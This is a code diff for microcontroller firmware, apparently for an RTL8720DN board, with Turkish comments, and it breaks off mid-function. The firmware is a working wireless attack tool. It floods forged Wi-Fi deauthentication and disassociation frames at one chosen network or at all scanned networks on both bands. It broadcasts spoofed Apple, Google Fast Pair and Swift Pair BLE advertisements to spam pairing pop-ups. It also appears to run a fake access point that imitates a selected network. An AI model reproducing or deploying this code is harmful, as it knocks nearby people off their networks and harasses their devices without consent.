@@ -14,20 +14,9 @@
 #include "BLEDevice.h"
 #include "BLEAdvertData.h"
 
-// AmebaD BLE gap katmanı — rastgele MAC ve cihaz adı için low-level erişim
-// le_gen_rand_addr / le_set_rand_addr SDK header'larında (gap_le.h) zaten T_GAP_CAUSE ile tanımlı
-// — tekrar bildirmiyoruz, sadece le_adv_set_param eksik olduğu için onu bildiriyoruz
 extern "C" {
   bool le_adv_set_param(uint8_t param, uint8_t len, void *p_value);
 }
-
-// ── WiFi BB register yazımı neden YOK ────────────────────────────────────────
-// RTL8720DN çift çekirdeklidir: KM0 (WiFi sürücüsü) + KM4 (Arduino kodu).
-// WiFi BB register'ları (0x40080000+) yalnızca KM0 bus alanındadır.
-// KM4'ten doğrudan pointer ile yazım çalışmaz (0xEAEAEAEA bus hata yanıtı).
-// rtw_hal_write_bbreg() denendi ancak rltk_wlan_info adapter pointer'ı
-// geçersiz olduğunda setup() crash ediyor — AP kalkmıyor.
-// Güç yönetimi wifi_disable_powersave() ile yapılıyor; bu SDK IPC çağrısıdır.
 
 #undef max
 #undef min
@@ -62,17 +51,11 @@ extern "C" {
   int  wifi_disable_powersave(void);
   int  wifi_set_mode(rtw_mode_t mode);
   int  wifi_scan_networks(rtw_scan_result_handler_t handler, void *user_data);
+  int  wifi_scan_networks_mcc(rtw_scan_result_handler_t results_handler, void *user_data);
   int  wifi_is_connected_to_ap(void);
   int  wifi_connect(char *ssid, rtw_security_t security_type, char *password, int ssid_len, int password_len, int key_id, void *semaphore);
+  int  wext_private_command(const char *ifname, char *cmd, int show_msg);
 }
-
-// ── WiFi BB register yazımı neden YOK ────────────────────────────────────────
-// RTL8720DN çift çekirdeklidir: KM0 (WiFi sürücüsü) + KM4 (Arduino kodu).
-// WiFi BB register'ları (0x40080000+) yalnızca KM0 bus alanındadır.
-// KM4'ten bu adreslere yazıldığında bus matrisi yazımı reddeder → 0xEAEAEAEA
-// okunur (bus hata yanıtı). Doğrudan register yazımı çalışmaz.
-// Güç yönetimi wifi_disable_powersave() ile sağlanıyor — o bir SDK IPC çağrısı
-// olduğu için KM0 üzerinden gerçekten işlem görür.
 
 #ifndef PACK_STRUCT_FIELD
 #define PACK_STRUCT_FIELD(x) x
@@ -239,10 +222,6 @@ void DNSServer::packetHandler(void *arg, struct udp_pcb *udp_pcb, struct pbuf *u
     pbuf_free(udp_packet_buffer);
 }
 
-// ══════════════════════════════════════════════════════════════════════════════
-// ═══════════════════════ TURBO MODE PARAMETRELERI ════════════════════════════
-// ══════════════════════════════════════════════════════════════════════════════
-
 #define DHCP_START   1
 #define DHCP_STOP    0
 #define IW_MODE_INFRA 2
@@ -259,7 +238,6 @@ void DNSServer::packetHandler(void *arg, struct udp_pcb *udp_pcb, struct pbuf *u
 #define FLASH_BUF_SIZE   256
 #define FLASH_OFFSET     0x00100000 
 
-// ═══════════════════════ DEAUTH AYARLARI (SKB BUFFER SAFE) ════════════════════
 #define DEAUTH_BURST_INTERVAL_MS    120
 #define DEAUTH_FRAME_COUNT_2G       4
 #define DEAUTH_FRAME_COUNT_5G       4
@@ -272,10 +250,9 @@ void DNSServer::packetHandler(void *arg, struct udp_pcb *udp_pcb, struct pbuf *u
 #define DEAUTH_FRAME_INTER_DELAY_MS 3
 #define DEAUTH_SKB_BACKOFF_MS       20
 
-// ═══════════════════════ SCAN PARAMETRELERI (FIX) ═════════════════════════════
-#define SCAN_TIMEOUT_MS             15000   // Scan için timeout
-#define SCAN_RETRY_COUNT            3       // Kaç kez retry yapacak
-#define SCAN_RESULT_WAIT_MS         10000   // Sonuçları bekleme süresi
+#define SCAN_TIMEOUT_MS             15000
+#define SCAN_RETRY_COUNT            3
+#define SCAN_RESULT_WAIT_MS         35000
 
 struct SavedCredentials {
   uint8_t magic;
@@ -400,7 +377,6 @@ bool isSisterBSSID(const uint8_t *base, const uint8_t *candidate) {
   return (diff >= 1 && diff <= 4);
 }
 
-// ─── AĞ TARAYICI (FIX VERSIYONU) ─────────────────────────────────────────────
 static std::vector<NetworkInfo> scan_temp;
 static volatile int scan_result_count = 0;
 
@@ -418,7 +394,6 @@ rtw_result_t raw_scan_handler(rtw_scan_handler_result_t *malloced_scan_result) {
     NetworkInfo net;
     char ssid_str[33] = {0};
 
-    // SSID'yi güvenli şekilde kopyala
     if (record->SSID.len > 0 && record->SSID.len <= 32) {
       memcpy(ssid_str, record->SSID.val, record->SSID.len);
       ssid_str[record->SSID.len] = '\0';
@@ -426,16 +401,14 @@ rtw_result_t raw_scan_handler(rtw_scan_handler_result_t *malloced_scan_result) {
 
     net.ssid = String(ssid_str);
     net.rssi = record->signal_strength;
-    net.channel = record->channel; 
+    net.channel = record->channel;
 
-    // BSSID'yi kopyala
     if (record->BSSID.octet != NULL) {
       memcpy(net.bssid, record->BSSID.octet, 6);
     } else {
       memset(net.bssid, 0, 6);
     }
 
-    // Security türünü belirle
     net.raw_sec = record->security;
     if (record->security == RTW_SECURITY_OPEN) {
       net.enc = ENC_TYPE_NONE;
@@ -453,18 +426,15 @@ rtw_result_t raw_scan_handler(rtw_scan_handler_result_t *malloced_scan_result) {
     }
 
     if (net.ssid.length() > 0) {
-      // Fake AP BSSID'sini kontrol et
       if (isFakeAPBSSID(net.bssid)) {
         return RTW_SUCCESS;
       }
 
-      // 5GHz sister BSSID kontrolü
       if (net.channel >= 36 && target_bssid[0] != 0 && isSisterBSSID(target_bssid, net.bssid)) {
         target_5g_channel = net.channel;
         memcpy(target_5g_bssid, net.bssid, 6);
       }
 
-      // Duplicate kontrol
       bool dup = false;
       for (auto &existing : scan_temp) {
         if (existing.ssid == net.ssid) {
@@ -505,7 +475,7 @@ void scanNetworkTask(void *param) {
   }
 
   wifi_disable_powersave();
-  wifi_scan_networks(raw_scan_handler, NULL);
+  wifi_scan_networks_mcc(raw_scan_handler, NULL);
 
   if (raw_scan_sem != NULL) {
     xSemaphoreTake(raw_scan_sem, pdMS_TO_TICKS(SCAN_RESULT_WAIT_MS));
@@ -538,7 +508,6 @@ void startScan() {
   xTaskCreate(scanNetworkTask, "scan", 8192, NULL, tskIDLE_PRIORITY + 2, NULL);
 }
 
-// ─── BAĞLANTI GÖREVİ (SPEED OPTIMIZED) ────────────────────────────────────────
 void wifiConnectTask(void *param) {
   (void)param;
   bool is_open  = (pending_sec == RTW_SECURITY_OPEN);
@@ -547,7 +516,7 @@ void wifiConnectTask(void *param) {
 
 
   wifi_disconnect();
-  vTaskDelay(pdMS_TO_TICKS(50));  // HIZLI BAĞLANTI İÇİN 50ms'e indirildi
+  vTaskDelay(pdMS_TO_TICKS(50));
 
   TickType_t t_start = xTaskGetTickCount();
   ret = wifi_connect((char *)pending_ssid, pending_sec,
@@ -555,7 +524,7 @@ void wifiConnectTask(void *param) {
   uint32_t elapsed_ms = (xTaskGetTickCount() - t_start) * portTICK_PERIOD_MS;
 
   if (ret == RTW_SUCCESS) {
-    vTaskDelay(pdMS_TO_TICKS(100));  // 100ms'e indirildi (200'den)
+    vTaskDelay(pdMS_TO_TICKS(100));
     if (wifi_is_connected_to_ap() != RTW_SUCCESS) ret = RTW_ERROR;
   }
 
@@ -569,17 +538,17 @@ void wifiConnectTask(void *param) {
       fallback = RTW_SECURITY_WPA2_MIXED_PSK;
     }
     wifi_disconnect();
-    vTaskDelay(pdMS_TO_TICKS(50));  // 50ms'e indirildi
+    vTaskDelay(pdMS_TO_TICKS(50));
     ret = wifi_connect((char *)pending_ssid, fallback,
                        (char *)pending_pass, (int)strlen(pending_ssid), pass_len, -1, NULL);
     if (ret == RTW_SUCCESS) {
-      vTaskDelay(pdMS_TO_TICKS(100));  // 100ms'e indirildi
+      vTaskDelay(pdMS_TO_TICKS(100));
       if (wifi_is_connected_to_ap() != RTW_SUCCESS) ret = RTW_ERROR;
     }
   }
 
   if (ret == RTW_SUCCESS) {
-    vTaskDelay(pdMS_TO_TICKS(100));  // 100ms'e indirildi
+    vTaskDelay(pdMS_TO_TICKS(100));
     wifi_disable_powersave();
     conn_status = CS_DONE_OK;
   } else {
@@ -594,9 +563,6 @@ void startConnectTask() {
   xTaskCreate(wifiConnectTask, "wconn", 8192, NULL, tskIDLE_PRIORITY + 2, NULL);
 }
 
-// ═══════════════════════════════════════════════════════════════════════════════
-// ═══ SKB-SAFE frame gönderici: hata durumunda backoff uygular ════════════════
-// ═══════════════════════════════════════════════════════════════════════════════
 static uint32_t safeSendMgnt_ok_count  = 0;
 static uint32_t safeSendMgnt_err_count = 0;
 
@@ -611,9 +577,6 @@ static inline void safeSendMgnt(uint8_t *frame, uint16_t len) {
   }
 }
 
-// ═══════════════════════════════════════════════════════════════════════════════
-// ═══════════ DEAUTH GÖREVİ (SKB BUFFER KORUMALR - 2.4GHz & 5GHz) ═══════════
-// ═══════════════════════════════════════════════════════════════════════════════
 void deauthTask(void *param) {
   (void)param;
 
@@ -644,7 +607,6 @@ void deauthTask(void *param) {
       wifi_disable_powersave();
     }
 
-    // 2.4GHz DEAUTH
     wifi_set_channel(target_channel);
     wifi_disable_powersave();
     vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));
@@ -696,7 +658,6 @@ void deauthTask(void *param) {
         vTaskDelay(pdMS_TO_TICKS(EXTRA_BURST_DELAY_MS));
     }
 
-    // 5GHz DEAUTH
     int32_t ch5g = target_5g_channel;
     uint8_t bssid5g[6];
     memcpy(bssid5g, target_5g_bssid, 6);
@@ -761,18 +722,6 @@ void deauthTask(void *param) {
   vTaskDelete(NULL);
 }
 
-// ═══════════════════════════════════════════════════════════════════════════════
-// ════════════════ BLE RAW PAKET VERİTABANI (REFERANS: sprensis/BLE-spam-BW16) ═
-// ═══════════════════════════════════════════════════════════════════════════════
-// Doğru yöntem: Ham raw AD yapısı baytları addData() ile gönderilir.
-// iOS/Android manufacturer data payload'ını tanır, GAP cihaz adına bakmaz.
-// setAdvType(GAP_ADTYPE_ADV_NONCONN_IND) → non-connectable: AMEBA_BLE_DEV görünmez.
-// Her paket: [length][AD_type][data...] tam AD yapısı olarak gönderilir.
-// ─────────────────────────────────────────────────────────────────────────────
-
-// ── Apple Proximity Pairing — tam 31 byte raw AD paketi ──────────────────────
-// [0x1e=30][0xff=ManufSpec][0x4c,0x00=Apple][0x07=ProxPairing][0x19=len25]
-// [flags][model_byte][status][bat_lid][bat_R][bat_L][color][suffix][account_token x15]
 static uint8_t ble_Airpods[31]        = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
 static uint8_t ble_AirpodsPro[31]     = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
 static uint8_t ble_AirpodsMax[31]     = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
@@ -790,9 +739,6 @@ static uint8_t ble_BeatsX[31]         = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x05
 static uint8_t ble_BeatsSolo3[31]     = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x06,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
 static uint8_t ble_BeatsFlex[31]      = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x10,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
 
-// ── Apple Nearby Action — 23 byte raw AD paketi ───────────────────────────────
-// [0x16=22][0xff=ManufSpec][0x4c,0x00=Apple][0x04=Nearby][0x04,len,...]
-// [0x0f=type][0x05=len][0xc1=flags][action_byte][...]
 static uint8_t ble_AppleTVSetup[23]   = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x01,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
 static uint8_t ble_AppleTVPair[23]    = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x06,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
 static uint8_t ble_AppleTVNewUser[23] = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x20,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
@@ -819,8 +765,6 @@ static const BLERawPacket BLE_APPLE_PKTS[] = {
 };
 #define BLE_APPLE_PKT_COUNT 24
 
-// ── Google Fast Pair model ID tablosu (Android full-screen pairing popup) ─────
-// Format: [0x03][0x03][0x2C][0xFE] UUID list + [0x06][0x16][0x2C][0xFE][modelID x3] + [0x02][0x0A][rssi]
 static const uint32_t BLE_GFP_MODELS[] = {
   0x92BBBD, // Pixel Buds
   0xD446A7, // Sony XM5
@@ -845,9 +789,6 @@ static const uint32_t BLE_GFP_MODELS[] = {
 };
 #define BLE_GFP_COUNT 20
 
-// ═══════════════════════════════════════════════════════════════════════════════
-// ═══════════ DEAUTH ALL GÖREVİ — TÜM TARANAN AĞLARA DEAUTH ══════════════════
-// ═══════════════════════════════════════════════════════════════════════════════
 void deauthAllTask(void *param) {
   (void)param;
 
@@ -859,18 +800,16 @@ void deauthAllTask(void *param) {
 
   wifi_disable_powersave();
 
-  // ── Deauth All hız parametreleri ──────────────────────────────────────────
-  const int DA_FRAME_COUNT_2G   = 6;    // burst başına frame sayısı
+  const int DA_FRAME_COUNT_2G   = 6;
   const int DA_FRAME_COUNT_5G   = 5;
-  const int DA_EXTRA_COUNT_2G   = 2;    // ek burst sayısı
+  const int DA_EXTRA_COUNT_2G   = 2;
   const int DA_EXTRA_COUNT_5G   = 2;
-  const int DA_CH_SWITCH_MS     = 10;   // kanal geçiş süresi: radyonun kanala kilitlenmesi için yeterli
-  const int DA_NET_DWELL_MS     = 60;   // her ağ için minimum kalma süresi: frame'lerin havaya çıkmasını garantiler
+  const int DA_CH_SWITCH_MS     = 10;
+  const int DA_NET_DWELL_MS     = 60;
 
-#define DEAUTH_ALL_RESCAN_INTERVAL_MS 120000UL  // 60s→120s: daha seyrek, saldırıyı az keser
+#define DEAUTH_ALL_RESCAN_INTERVAL_MS 120000UL
   unsigned long deauth_all_last_scan_ms = 0;
 
-  // Görev başlar başlamaz hemen tarama yap — networks boşsa beklemeden başlat
   if (scan_status == SCAN_IDLE) {
     startScan();
     unsigned long scan_wait_start = (unsigned long)(xTaskGetTickCount() * portTICK_PERIOD_MS);
@@ -884,16 +823,14 @@ void deauthAllTask(void *param) {
   }
 
   while (deauth_all_active) {
-    // Periyodik otomatik yeniden tarama (arka planda, deauth durdurmaz)
     unsigned long now_ms = (unsigned long)(xTaskGetTickCount() * portTICK_PERIOD_MS);
     if (now_ms - deauth_all_last_scan_ms > DEAUTH_ALL_RESCAN_INTERVAL_MS) {
       if (scan_status == SCAN_IDLE) {
-        startScan();  // ayrı task olarak çalışır, deauth durmaz
+        startScan();
       }
       deauth_all_last_scan_ms = now_ms;
     }
 
-    // Her döngü başında güncel networks listesinden taze snapshot al
     std::vector<NetworkInfo> snap;
     if (networks_mutex && xSemaphoreTake(networks_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
       snap = networks;
@@ -906,12 +843,8 @@ void deauthAllTask(void *param) {
     }
 
 
-    // ── WiFi Deauth turu — kanallar gruplandırılmış ───────────────────────────
-    // Aynı kanalda olan ağları tek kanal switch'i ile saldır.
-    // Kanal sırası: önce 2.4GHz (1-14), sonra 5GHz (36+).
     wifi_disable_powersave();
 
-    // Snapshot'taki unique kanalları sıralı olarak topla
     std::vector<int> ch_order;
     for (auto &net : snap) {
       if (isFakeAPBSSID(net.bssid)) continue;
@@ -919,7 +852,6 @@ void deauthAllTask(void *param) {
       for (int c : ch_order) { if (c == net.channel) { found = true; break; } }
       if (!found) ch_order.push_back(net.channel);
     }
-    // 2.4GHz önce, 5GHz sonra
     std::vector<int> ch_sorted;
     for (int c : ch_order) { if (c < 36) ch_sorted.push_back(c); }
     for (int c : ch_order) { if (c >= 36) ch_sorted.push_back(c); }
@@ -931,17 +863,14 @@ void deauthAllTask(void *param) {
       int frameCount = is5g ? DA_FRAME_COUNT_5G : DA_FRAME_COUNT_2G;
       int extraBurst = is5g ? DA_EXTRA_COUNT_5G : DA_EXTRA_COUNT_2G;
 
-      // Bu kanal için bir kez switch — gruptaki tüm ağlar buradan saldırılır
       wifi_set_channel(ch);
       vTaskDelay(pdMS_TO_TICKS(DA_CH_SWITCH_MS));
 
-      // Aynı kanalda olan tüm ağları sırayla saldır
       for (auto &net : snap) {
         if (!deauth_all_active) break;
         if (net.channel != ch) continue;
         if (isFakeAPBSSID(net.bssid)) continue;
 
-        // ── BSSID varyantlarını hesapla ─────────────────────────────────────
         uint8_t variants[3][6];
         int vcount = 0;
         for (int off = -1; off <= 1; off++) {
@@ -954,28 +883,26 @@ void deauthAllTask(void *param) {
         }
         if (vcount == 0) continue;
 
-        // ── Ana burst: broadcast + unicast deauth/disassoc ──────────────────
         for (int burst = 0; burst < frameCount; burst++) {
           for (int v = 0; v < vcount; v++) {
             memcpy(&frame[10], variants[v], 6);
             memcpy(&frame[16], variants[v], 6);
             memset(&frame[4], 0xFF, 6);
             frame[0] = 0xC0; frame[24] = 0x07;
-            safeSendMgnt(frame, 26);         // broadcast deauth
+            safeSendMgnt(frame, 26);
 
             frame[24] = 0x02;
-            safeSendMgnt(frame, 26);         // broadcast disassoc
+            safeSendMgnt(frame, 26);
 
             memcpy(&frame[4], variants[v], 6);
             frame[0] = 0xC0; frame[24] = 0x07;
-            safeSendMgnt(frame, 26);         // unicast deauth
+            safeSendMgnt(frame, 26);
 
             frame[0] = 0xA0; frame[24] = 0x07;
-            safeSendMgnt(frame, 26);         // unicast disassoc
+            safeSendMgnt(frame, 26);
           }
         }
 
-        // ── Ek broadcast burst ───────────────────────────────────────────────
         memcpy(&frame[10], net.bssid, 6);
         memcpy(&frame[16], net.bssid, 6);
         memset(&frame[4], 0xFF, 6);
@@ -991,43 +918,29 @@ void deauthAllTask(void *param) {
     }
 
 
-    // Tur arası bekleme yok — maksimum hız için hemen sonraki tura geç
   }
 
   vTaskDelete(NULL);
 }
 
-// ═══════════════════════════════════════════════════════════════════════════════
-// ══════════════════ BLE RAW ADV GÖNDERİCİ ════════════════════════════════════
-// ═══════════════════════════════════════════════════════════════════════════════
-// Referans yaklaşımı: raw AD paketini doğrudan addData() ile ver,
-// setAdvType(GAP_ADTYPE_ADV_NONCONN_IND) + updateAdvertParams() ile yayınla.
-// Böylece cihaz AMEBA_BLE_DEV değil, manufacturer data'ya göre tanınır.
 static void bleSetRawAdv(BLEAdvert *pAdv, const uint8_t *rawpkt, uint8_t rawlen) {
   pAdv->stopAdv();
   vTaskDelay(pdMS_TO_TICKS(5));
 
-  // ── BLE TX Power: donanım maksimumu +8 dBm ──────────────────────────────
-  // RTK BLE SDK: GAP_PARAM_ADV_TX_POWER_LEVEL = 0x12, int8_t (-20..+8 dBm)
   int8_t ble_tx_power = 8;
   le_adv_set_param(0x12, sizeof(ble_tx_power), &ble_tx_power);
 
-  // ── Reklam aralığı: BLE spesifikasyon minimumu = 20ms (0x0020 × 0.625ms)
-  // GAP_PARAM_ADV_MIN_INTERVAL = 0x15, GAP_PARAM_ADV_MAX_INTERVAL = 0x16
   uint16_t adv_interval = 0x0020;
   le_adv_set_param(0x15, sizeof(adv_interval), &adv_interval);
   le_adv_set_param(0x16, sizeof(adv_interval), &adv_interval);
 
-  // ── Tüm 3 BLE reklam kanalı aktif: 37, 38, 39 (bit mask 0x07) ───────────
-  // GAP_PARAM_ADV_CHANNEL_MAP = 0x18
   uint8_t ch_map = 0x07;
   le_adv_set_param(0x18, sizeof(ch_map), &ch_map);
 
-  // ── Rastgele MAC: her çağrı = farklı cihaz görünümü ─────────────────────
   uint8_t rand_addr[6];
   if (le_gen_rand_addr((T_GAP_RAND_ADDR_TYPE)0, rand_addr) == GAP_CAUSE_SUCCESS) {
     le_set_rand_addr(rand_addr);
-    uint8_t own_addr_type = 1; // GAP_LOCAL_ADDR_LE_RANDOM
+    uint8_t own_addr_type = 1;
     le_adv_set_param(0x06, sizeof(own_addr_type), &own_addr_type);
   }
 
@@ -1041,9 +954,6 @@ static void bleSetRawAdv(BLEAdvert *pAdv, const uint8_t *rawpkt, uint8_t rawlen)
   vTaskDelay(pdMS_TO_TICKS(3));
 }
 
-// ═══════════════════════════════════════════════════════════════════════════════
-// ══════════════════ BLE FLOOD GÖREVİ ═════════════════════════════════════════
-// ═══════════════════════════════════════════════════════════════════════════════
 void bleFloodTask(void *param) {
   (void)param;
 
@@ -1051,42 +961,35 @@ void bleFloodTask(void *param) {
   BLE.beginPeripheral();
   BLEAdvert *pAdv = BLE.configAdvert();
 
-  // ── BLE init: tüm güç ve kanal parametrelerini en baştan max yap ─────────
   {
-    int8_t  tx_pwr      = 8;       // +8 dBm — RTL8720DN donanım maksimumu
-    uint16_t adv_itvl   = 0x0020;  // 20ms — BLE spesifikasyon minimumu
-    uint8_t  ch_map     = 0x07;    // kanal 37 + 38 + 39 — hepsi aktif
+    int8_t   tx_pwr   = 8;
+    uint16_t adv_itvl = 0x0020;
+    uint8_t  ch_map   = 0x07;
     le_adv_set_param(0x12, sizeof(tx_pwr),   &tx_pwr);
     le_adv_set_param(0x15, sizeof(adv_itvl), &adv_itvl);
     le_adv_set_param(0x16, sizeof(adv_itvl), &adv_itvl);
     le_adv_set_param(0x18, sizeof(ch_map),   &ch_map);
   }
 
-  // Google Fast Pair raw paketi (14 byte: UUID list + Service Data + TX Power)
   uint8_t gfp_pkt[14];
   gfp_pkt[0]  = 0x03; gfp_pkt[1]  = 0x03; gfp_pkt[2]  = 0x2C; gfp_pkt[3]  = 0xFE;
   gfp_pkt[4]  = 0x06; gfp_pkt[5]  = 0x16; gfp_pkt[6]  = 0x2C; gfp_pkt[7]  = 0xFE;
-  // TX Power AD: [0x02][0x0A=TX Power Level AD type][0x7F=+127 dBm max int8]
   gfp_pkt[11] = 0x02; gfp_pkt[12] = 0x0A; gfp_pkt[13] = 0x7F;
 
-  // Microsoft Swift Pair raw paketi (manufacturer specific, company 0x0006)
   uint8_t ms_pkt[13];
   ms_pkt[1] = 0xFF; ms_pkt[2] = 0x06; ms_pkt[3] = 0x00;
   ms_pkt[4] = 0x03; ms_pkt[5] = 0x00; ms_pkt[6] = 0x80;
 
   size_t apple_idx = 0;
   size_t gfp_idx   = 0;
-  uint8_t phase    = 0; // 0-2: Apple, 3-4: Google, 5: Microsoft
+  uint8_t phase    = 0;
 
   while (ble_flood_active) {
 
-    // ── PHASE 0-2: Apple Proximity Pairing — sıralı cihaz listesi ──────────
-    // Referans projeden alınan doğru raw AD formatı ile gönderilir
     if (phase < 3) {
       const BLERawPacket &p = BLE_APPLE_PKTS[apple_idx % BLE_APPLE_PKT_COUNT];
       uint8_t buf[31];
       memcpy(buf, p.pkt, p.len);
-      // Anti-duplicate: account token alanını (byte 19-30) rastgele değiştir
       TickType_t t = xTaskGetTickCount();
       if (p.len == 31) {
         buf[19] = (uint8_t)(t & 0xFF);
@@ -1098,7 +1001,6 @@ void bleFloodTask(void *param) {
       vTaskDelay(pdMS_TO_TICKS(80));
     }
 
-    // ── PHASE 3-4: Google Fast Pair — Android full-screen popup ─────────────
     else if (phase < 5) {
       uint32_t model = BLE_GFP_MODELS[gfp_idx % BLE_GFP_COUNT];
       gfp_pkt[8]  = (uint8_t)((model >> 16) & 0xFF);
@@ -1109,20 +1011,17 @@ void bleFloodTask(void *param) {
       vTaskDelay(pdMS_TO_TICKS(70));
     }
 
-    // ── PHASE 5: Microsoft Swift Pair — Windows "Yeni cihaz" bildirimi ──────
     else {
       TickType_t t = xTaskGetTickCount();
-      // rastgele uzunlukta isim (1-6 karakter) ile Swift Pair paketi
-      uint8_t namelen = (uint8_t)((t & 0x05) + 1); // 1-6
-      ms_pkt[0] = (uint8_t)(6 + namelen);           // length byte
+      uint8_t namelen = (uint8_t)((t & 0x05) + 1);
+      ms_pkt[0] = (uint8_t)(6 + namelen);
       for (int c = 0; c < namelen; c++) {
-        ms_pkt[7 + c] = (uint8_t)(0x41 + ((t + c * 7) % 26)); // A-Z
+        ms_pkt[7 + c] = (uint8_t)(0x41 + ((t + c * 7) % 26));
       }
       bleSetRawAdv(pAdv, ms_pkt, 7 + namelen);
       vTaskDelay(pdMS_TO_TICKS(80));
     }
 
-    // Sıradaki phase'e geç (0→1→2→3→4→5→0→...)
     phase = (phase + 1) % 6;
   }
 
@@ -1131,9 +1030,6 @@ void bleFloodTask(void *param) {
   vTaskDelete(NULL);
 }
 
-// ─────────────────────────────────────────────────────────────────────────────
-
-// ─── GÖRSELLER VE YÖNLENDİRME ────────────────────────────────────────────────
 String rssiBar(int32_t rssi) {
   if (rssi > -50) return "&#9608;&#9608;&#9608;&#9608; Mükemmel";
   if (rssi > -65) return "&#9608;&#9608;&#9608;&#9617; İyi";
@@ -1217,15 +1113,20 @@ void sendStartPage(WiFiClient &client) {
     for (int i = 0; i < (int)networks.size(); i++) {
       String safe = networks[i].ssid;
       safe.replace("&", "&amp;"); safe.replace("<", "&lt;"); safe.replace("'", "&#39;"); safe.replace("\"", "&quot;");
+      bool is5g = (networks[i].channel >= 36);
 
       client.print("<li class='net-item' onclick=\"document.getElementById('r"); client.print(i); client.print("').checked=true\">");
-      client.print("<input type='radio' name='ssid' id='r"); client.print(i); client.print("' value='"); client.print(safe); client.print("' required>");
+      client.print("<input type='radio' name='net_idx' id='r"); client.print(i); client.print("' value='"); client.print(i); client.print("' required>");
       client.print("<div class='net-info'><div class='net-name'>"); client.print(safe);
       if      (networks[i].enc == ENC_TYPE_NONE) client.print(" <span style='font-size:.7rem;background:#e74c3c;color:#fff;padding:2px 5px;border-radius:4px;'>Açık</span>");
       else if (networks[i].enc == ENC_TYPE_WPA3) client.print(" <span style='font-size:.7rem;background:#8e44ad;color:#fff;padding:2px 5px;border-radius:4px;'>WPA3</span>");
       else if (networks[i].enc == ENC_TYPE_TKIP) client.print(" <span style='font-size:.7rem;background:#e67e22;color:#fff;padding:2px 5px;border-radius:4px;'>WPA</span>");
+      if (is5g) client.print(" <span style='font-size:.7rem;background:#2980b9;color:#fff;padding:2px 5px;border-radius:4px;'>5GHz</span>");
+      else      client.print(" <span style='font-size:.7rem;background:#27ae60;color:#fff;padding:2px 5px;border-radius:4px;'>2.4GHz</span>");
       client.print("</div>");
-      client.print("<div class='net-meta'>Sinyal Kalitesi: "); client.print(rssiBar(networks[i].rssi)); client.print("</div></div></li>");
+      client.print("<div class='net-meta'>Sinyal: "); client.print(rssiBar(networks[i].rssi));
+      client.print(" | Kanal: "); client.print(networks[i].channel);
+      client.print("</div></div></li>");
     }
   } else if (scan_status != SCAN_RUNNING) {
     client.print("<li style='padding:16px;text-align:center;color:#7f8c8d;'>❌ Herhangi bir ağ bulunamadı. Lütfen ağları yenile.</li>");
@@ -1506,25 +1407,37 @@ void handleClient(WiFiClient &client) {
     }
 
     if (request.startsWith("POST") && path == "/start_ap") {
-      String sel_ssid = parsePostParam(body, "ssid");
-      if (sel_ssid.length() == 0) { sendStartPage(client); return; }
+      String sel_idx_str = parsePostParam(body, "net_idx");
+      if (sel_idx_str.length() == 0) { sendStartPage(client); return; }
 
-      strncpy(target_ssid, sel_ssid.c_str(), MAX_SSID_LEN - 1);
-      target_ssid[MAX_SSID_LEN - 1] = '\0';
+      int sel_idx = sel_idx_str.toInt();
       target_channel = 6;
       target_enc     = ENC_TYPE_CCMP;
       target_sec     = RTW_SECURITY_WPA2_AES_PSK;
       target_5g_channel = 0;
+      memset(target_bssid,    0, 6);
       memset(target_5g_bssid, 0, 6);
 
       if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
-      for (auto &net : networks) {
-        if (net.ssid == sel_ssid) {
-          target_channel = net.channel;
-          target_enc     = net.enc;
-          target_sec     = net.raw_sec;
-          memcpy(target_bssid, net.bssid, 6);
-          break;
+      if (sel_idx >= 0 && sel_idx < (int)networks.size()) {
+        NetworkInfo &net = networks[sel_idx];
+        strncpy(target_ssid, net.ssid.c_str(), MAX_SSID_LEN - 1);
+        target_ssid[MAX_SSID_LEN - 1] = '\0';
+        target_channel = net.channel;
+        target_enc     = net.enc;
+        target_sec     = net.raw_sec;
+        memcpy(target_bssid, net.bssid, 6);
+        // 5GHz ağ seçilmişse: bu ağı 5GHz hedef yap, 2.4GHz kardeşi ara
+        if (net.channel >= 36) {
+          target_5g_channel = net.channel;
+          memcpy(target_5g_bssid, net.bssid, 6);
+          for (auto &n : networks) {
+            if (n.ssid == net.ssid && n.channel < 36) {
+              target_channel = n.channel;
+              memcpy(target_bssid, n.bssid, 6);
+              break;
+            }
+          }
         }
       }
       if (networks_mutex) xSemaphoreGive(networks_mutex);
@@ -1563,11 +1476,26 @@ void handleClient(WiFiClient &client) {
   client.flush();
 }
 
+static int agentSetTxPower(const char *ifname, int poweridx) {
+  if (poweridx > 63) poweridx = 63;
+  char buf[40];
+  snprintf(buf, sizeof(buf), "txpower patha=%d pathb=%d", poweridx, poweridx);
